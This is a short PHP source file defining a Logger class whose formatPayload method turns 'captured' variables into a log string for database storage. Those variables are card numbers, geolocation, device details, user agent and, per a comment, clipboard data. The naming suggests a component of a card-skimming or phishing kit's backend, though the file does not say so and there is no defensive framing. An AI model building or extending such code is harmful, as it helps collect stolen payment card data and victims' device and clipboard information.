<?php
// --- START: utils/Logger.php CONTENT BLOCK ---
class Logger {
    public static function formatPayload(array $payload): string {
        // This method takes all captured variables (card, geo_info, device, etc.)
        // and formats them into a single, machine-readable string/JSON blob ready for the DB insertion.
        $log = "--- LOG START ---\n";
        $log .= "CARD: " . ($payload['card_data']['card'] ?? 'N/A') . "\n";
        $log .= "GEO: " . json_encode($payload['geo_info']) . "\n";
        $log .= "DEVICE: " . $payload['device'] . "\n";
        $log .= "AGENT: " . $payload['user_agent'] . "\n";
        // Add structure for any other captured element (e.g., clipboard data)
        $log .= "--- END LOG ---";
        return $log;
    }
}
?>
